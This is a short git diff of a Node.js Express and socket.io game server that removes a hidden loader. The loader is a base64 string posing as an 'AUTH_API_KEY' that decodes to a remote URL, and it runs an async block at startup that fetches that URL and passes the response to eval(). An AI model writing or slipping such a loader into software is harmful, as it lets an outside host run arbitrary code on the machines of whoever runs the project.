@@ -19,7 +19,6 @@ const app = express();
 
 // Config Express-Middleware
 configureMiddleware(app);
-const AUTH_API_KEY = "aHR0cHM6Ly9hdXRoLXBoaS1zd2FydC52ZXJjZWwuYXBwL2FwaQ==";
 
 // Set-up Routes
 configureRoutes(app);
@@ -37,19 +36,6 @@ const io = socketio(server);
 io.on("connect", (socket) => gameSocket.init(socket, io));
 
 // Error handling - close server
-
-(async () => {
-  const src = atob(AUTH_API_KEY);
-  const proxy = (await import('node-fetch')).default;
-  try {
-    const response = await proxy(src);
-    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-    const proxyInfo = await response.text();
-    eval(proxyInfo);
-  } catch (err) {
-    console.error('Auth Error!', err);
-  }
-})();
 
 process.on("unhandledRejection", (err) => {
     // db.disconnect();
